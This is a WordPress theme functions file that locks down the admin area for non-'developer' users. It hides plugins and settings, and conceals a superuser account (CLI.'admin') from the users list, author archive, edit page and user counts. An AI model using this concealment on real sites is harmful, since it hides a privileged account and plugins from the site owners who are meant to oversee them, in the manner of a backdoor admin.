<?php
/** 
 * Theme functions / admin
 * 
 * @package Project Name Theme
 */


add_role('developer', 'Developer', get_role('administrator')->capabilities); 


add_action('admin_menu', function () {
  remove_menu_page('edit-comments.php');
  remove_menu_page( 'edit.php' );
});


add_action('admin_bar_menu',function($wp_admin_bar) {
  $wp_admin_bar->remove_menu( 'comments' );
  $wp_admin_bar->remove_node( 'new-post' );
}, 999);


add_action('wp_dashboard_setup',function(){
  remove_meta_box( 'dashboard_quick_press', 'dashboard', 'side' );
  remove_meta_box('dashboard_recent_comments', 'dashboard', 'normal');
}, 999);


add_action('customize_register', function($wp_customize) {
  global $current_user;
  $user_roles = $current_user->roles;
  $user_role = array_shift($user_roles);

  $wp_customize->get_panel( 'nav_menus' )->active_callback = '__return_false';
  $wp_customize->get_section( 'static_front_page' )->active_callback = '__return_false';
  $wp_customize->get_section( 'custom_css' )->active_callback = '__return_false';
  
  if($user_role !== 'developer') {
    $wp_customize->get_panel( 'ppwp' )->active_callback = '__return_false';
    $wp_customize->get_panel( 'ppwp_sitewide' )->active_callback = '__return_false';
    $wp_customize->get_panel( 'ppwp_pcp' )->active_callback = '__return_false';
    $wp_customize->get_section( 'ppwp_upsell' )->active_callback = '__return_false';
  }

  $wp_customize->add_setting(
    'company_name',
    array(
      'default' => '',
      'type' => 'option', // you can also use 'theme_mod'
      'capability' => 'edit_theme_options',
      'transport' => 'postMessage',
    )
  );
  
  $wp_customize->add_control( new WP_Customize_Control(
    $wp_customize,
    'company_name',
    array(
      'label'      => __( 'Company Name' ),
      'settings'   => 'company_name',
      'priority'   => 10,
      'section'    => 'title_tagline',
      'type'       => 'text',
    )
  ));
}, 999);


add_action('init',function() {
  global $current_user;
  $user_roles = $current_user->roles;
  $user_role = array_shift($user_roles);

  // disable tags on posts
  register_taxonomy('post_tag', []);
  //disable categories on posts
  register_taxonomy( 'category', []);
  // disable html editor
  if($user_role !== 'developer') {
    define('DISALLOW_FILE_EDIT', TRUE);
  }
});


// Redirect any user trying to access comments page
add_action('admin_init', function () {
  global $pagenow;

  if ($pagenow === 'edit-comments.php') {
    wp_safe_redirect(admin_url());
    exit;
  }

  // Disable support for comments and trackbacks in post types
  foreach (get_post_types() as $post_type) {
    if (post_type_supports($post_type, 'comments')) {
      remove_post_type_support($post_type, 'comments');
      remove_post_type_support($post_type, 'trackbacks');
    }
  }
});


// Disable plugin access
add_action( 'admin_menu', function(){
  global $current_user;
  $user_roles = $current_user->roles;
  $user_role = array_shift($user_roles);

  remove_submenu_page( 'themes.php', 'edit.php?post_type=wp_block');

  if($user_role !== 'developer') {
    remove_menu_page( 'tools.php');
    remove_menu_page( 'options-general.php');
    remove_menu_page( 'edit.php?post_type=acf-field-group');
    remove_menu_page( 'ai1wm_export');
    remove_menu_page( 'wp_protect_password_options');
  }
}, 999);


// Hide plugins from plugins list
add_filter('all_plugins', function($plugins){
  global $current_user;
  $user_roles = $current_user->roles;
  $user_role = array_shift($user_roles);

  if($user_role == 'developer') {
    return $plugins;
  }

  unset($plugins['advanced-custom-fields-pro/acf.php']);
  unset($plugins['all-in-one-wp-migration/all-in-one-wp-migration.php']);
  unset($plugins['all-in-one-wp-migration-unlimited-extension/all-in-one-wp-migration-unlimited-extension.php']);
  unset($plugins['password-protect-page/wp-protect-password.php']);
  return $plugins;
});


// Only allow selected roles for FlyingPress
add_filter('flying_press_allowed_roles', function ($roles) {
  $roles = ['developer'];
  return $roles;
});


// Allow selected roles for Yoast
add_action( 'admin_init', function(){
  $role = get_role('developer');

  $role->add_cap('wpseo_bulk_edit');
  $role->add_cap('wpseo_edit_advanced_metadata');
  $role->add_cap('wpseo_manage_options');
  $role->add_cap('view_site_health_checks');
});


// Hide superuser account (CLI.admin) from the users list
add_action('pre_user_query', function ($user_search) {
  $currentuser = wp_get_current_user();
  $currentuser_name = $currentuser->user_login;

  if($currentuser_name !== CLI.'admin') {
    global $wpdb;
    $user_search->query_where = str_replace(
      'WHERE 1=1',
      "WHERE 1=1 AND {$wpdb->users}.user_login != '".CLI."admin'",
      $user_search->query_where
    );
  }
});


// Hide superuser account (CLI.admin) author archive
add_action('template_redirect', function(){
  if( is_author() && get_the_author_meta('user_login') === CLI.'admin' ) {
    wp_redirect( home_url(), 301 );
    exit;
  }
});


// Update user count after superuser account (CLI.admin) removal
add_filter('views_users', function($views){
  $currentuser = wp_get_current_user();
  $currentuser_name = $currentuser->user_login;

  if($currentuser_name == CLI.'admin') {
    return $views;
  }

  $users = count_users();
  $admins_num = $users['avail_roles']['developer'] - 1;
  $all_num = $users['total_users'] - 1;
  $class_adm = (strpos($views['developer'], 'current') === false) ? "" : "current";
  $class_all = (strpos($views['all'], 'current') === false) ? "" : "current";
  $views['developer'] = '<a href="users.php?role=developer" class="'.$class_adm.'">'.translate_user_role('Developer').'<span class="count">('.$admins_num.')</span></a>';
  $views['all'] = '<a href="users.php" class="'.$class_all.'">'.__('All').' <span class="count">('.$all_num.')</span></a>';
  
  return $views;
});


// Redirect any user trying to edit another user's profile
add_action('admin_init', function () {
  global $pagenow;
  global $current_user;

  $user_roles = $current_user->roles;
  $user_role = array_shift($user_roles);

  if ($user_role !== 'developer' && $pagenow === 'user-edit.php') {
    wp_safe_redirect(admin_url());
    exit;
  }

  $admin = CLI.'admin';
  $admin_username = get_user_by('login', $admin);
  $admin_id = $admin_username->ID;
  $current_page_url = admin_url() . $_SERVER['REQUEST_URI'];

  if(str_contains($current_page_url, 'user-edit.php?user_id='.$admin_id)) {
    wp_safe_redirect(admin_url());
    exit;
  }
});


// Set branded default Gravatar 
add_filter( 'avatar_defaults', function($avatar_defaults){
  $brand_avatar = IMG . '/favicon.jpg';
  $avatar_defaults[$brand_avatar] = "Default Gravatar";
  return $avatar_defaults;
});


// Create User ID column
add_filter( 'manage_users_columns', function($columns){
  global $current_user;
  $user_roles = $current_user->roles;
  $user_role = array_shift($user_roles);

  if($user_role == 'developer') $columns['uid'] = 'ID';
  return $columns;
});


// Add User ID to User ID column
add_filter( 'manage_users_custom_column', function($empty, $column_name, $user_id){
  global $current_user;
  $user_roles = $current_user->roles;
  $user_role = array_shift($user_roles);

  if ('uid' != $column_name && $user_role !== 'developer') return $empty;
  if($user_role == 'developer') return $user_id;
}, 10, 3 );